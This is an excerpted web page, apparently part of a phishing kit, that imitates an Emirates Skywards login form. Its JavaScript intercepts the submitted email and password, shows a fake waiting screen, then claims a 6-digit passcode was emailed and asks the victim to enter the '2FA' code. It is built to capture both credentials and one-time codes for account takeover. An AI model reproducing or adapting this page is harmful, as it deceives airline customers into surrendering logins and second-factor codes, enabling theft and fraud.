    ...
    <div class="login-container">
        ...
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" class="login-form">
            <div class="form-group">
                ...
                <input type="email" id="email" name="email" required placeholder="Email or Emirates Skywards number">
            </div>
            <div class="form-group">
...
</td></tr></table><!--[if mso]>    </td>    </tr>    </table>    <![endif]--><!-- Ts&Cs : END --></td></tr></table>
...
<script>
    ...
    document.addEventListener("DOMContentLoaded", function(){
        ...
        document.querySelector(".login-form").addEventListener("submit", function(e){
            ...
            loadingWindow.innerHTML = "<style>h1, p { font-family: Arial, sans-serif;}</style><br><h3>Please wait, this may take a few minutes. Do not refresh the page.</h3><br><center><img src='https://media3.giphy.com/media/jOmuouVZGQIBFynkMk/giphy.gif' alt='Loading...' style='width: 240px; height: 240px;'> </center>";
            ...
            xhr.onreadystatechange = function(){
                if(xhr.readyState == 4 && xhr.status == 200){
                    ...
                    setTimeout(function() {
                        ...
                        loadingWindow.innerHTML = "<div style='font-family: Arial, sans-serif; font-size: 24px;'>An email with a 6-digit passcode has been sent to " + email + "</div><br>";
                        ...
                        pinInput.setAttribute("placeholder", "Enter 2FA");
                        pinInput.setAttribute("required", "required"); // Make the input required
                        pinInput.style.fontFamily = "Verdana, sans-serif"; // Change font family
                        pinInput.style.fontSize = "18px"; // Change font size
                        pinInput.style.fontWeight = "bold"; // Change font weight
                        pinInput.style.borderRadius = "12px"; // Add border radius
                        pinInput.style.border = "1px solid #ccc"; // Add border
                        pinInput.style.width = "300px"; // Adjust width
                        pinInput.style.padding = "10px"; // Add padding
                        pinInput.style.boxSizing = "border-box"; // Include padding and border in the element's total width and height
                        pinInput.style.display = "block"; // Center horizontally
                        pinInput.style.margin = "auto"; // Center horizontally
                        loadingWindow.appendChild(pinInput);

                        // Create submit button for PIN
                        var submitButton = document.createElement("button");
                        submitButton.innerHTML = "Submit";
                        submitButton.style.backgroundColor = "rgb(209 10 17)"; // Green background color
                        ...
                        submitButton.style.display = "block"; // Make it a block element
                        submitButton.style.margin = "auto"; // Center horizontally
